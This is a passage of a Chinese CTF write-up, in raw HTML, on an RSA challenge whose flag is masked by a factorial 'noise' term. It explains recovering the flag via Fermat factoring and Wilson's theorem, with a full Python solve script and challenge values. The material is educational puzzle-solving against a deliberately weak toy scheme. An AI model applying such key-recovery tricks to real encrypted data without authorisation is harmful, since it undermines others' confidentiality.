keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    noise <span class="token operator">=</span> <span class="token punctuation">(</span>noise <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> qe <span class="token operator">=</span> <span class="token number">65537</span>m <span class="token operator">=</span> noise <span class="token operator">*</span> flag <span class="token operator">%</span> nc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># n=100189599139045520692403514463438191919411159406336533264628466489136567106850053961211156503402646767637582308399326881242266939213884415929464845632614082572953261137505406070253764077806987137037034310296845793371123661392496824861923474884525612617707544570336505659782455487338427377348917874318463239257</span><span class="token comment"># c=52162333124576686957153373769942403179822965367913494233622980146825418118797445630968150884296792193181121863149103395864786568453259110222784314675525339496760525297631678262500661476204948790654439464714409499209171376596016201182419029308570372822332848217278055720486674459768995713889509753949399299473</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题主要是考察数论四大基本定理的威尔逊定理，其形式如下</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)!\equiv-1\pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></span></p><p>这题的n很容易分解，看了一下同学们的解，好像都是用查库的方法分解的，当然这很合理，因为这题的p、q相差不大，很容易用费马分解法分出来，所以库里有很正常，当然我自己解不是这样做的。</p><p>主要的东西在后面，这题虽然知道p、q，但是noise从1到p-1，并且p有512bit，所以这个循环一般不会去跑（我出题都不是这样出数据的）。由于flag长度是37，所以flag有37*4=148bits，比q的比特数小。我们先求出d，恢复noise*flag。然后我们对其做如下处理</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>c</mi><mi>d</mi></msup><mo>=</mo><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>+</mo><mi>k</mi><mo>∗</mo><mi>n</mi><mo>=</mo><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>+</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>∗</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>≡</mo><mo>−</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo>−</mo><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mi>c</mi><mi>d</mi></msup><mo>≡</mo><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c^d\equiv noise*flag\pmod n\\c^d=noise*flag+k*n=noise*flag+k*p*q\\c^d\equiv noise*flag\pmod q\\p*\dots*(q-1)c^d\equiv p*\dots*(q-1)*noise*flag\pmod q\\p*\dots*(q-1)c^d\equiv (q-1)!*flag\equiv -flag\pmod q\\-p*\dots*(q-1)c^d\equiv flag\pmod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span></span></p><p>于是我们在模q的情况下就恢复了flag。完整脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot<span class="token punctuation">,</span> next_primen<span class="token operator">=</span><span class="token number">100189599139045520692403514463438191919411159406336533264628466489136567106850053961211156503402646767637582308399326881242266939213884415929464845632614082572953261137505406070253764077806987137037034310296845793371123661392496824861923474884525612617707544570336505659782455487338427377348917874318463239257</span>c<span class="token operator">=</span><span class="token number">52162333124576686957153373769942403179822965367913494233622980146825418118797445630968150884296792193181121863149103395864786568453259110222784314675525339496760525297631678262500661476204948790654439464714409499209171376596016201182419029308570372822332848217278055720486674459768995713889509753949399299473</span>q <span class="token operator">=</span> next_prime<span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> n <span class="token operator">//</span> qe <span class="token operator">=</span> <span class="token number">65537</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>mq <span class="token operator">=</span> <span class="token operator">-</span>m <span class="token operator">%</span> q<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>    mq <span class="token operator">=</span> <span class="token punctuation">(</span>mq <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> q<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>mq<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在之前我们提到，这题的数据并不是这样生成的，对于这样一个noise，我们仍然使用威尔逊定理。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>∗</mo><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>≡</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>n</mi><mi>o</mi><mi>i</mi><mi>s</mi><mi>e</mi><mo>≡</mo><mo>−</mo><mo stretchy="false">(</mo><mi>p</mi><mo>∗</mo><mo>⋯</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>q</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">noise\equiv (p-1)!\pmod q\\noise*p*\dots*(q-1)\equiv(q-1)!\equiv-1\pmod q\\noise\equiv-(p*\dots*(q-1))^{-1}\pmod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">o</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span><span 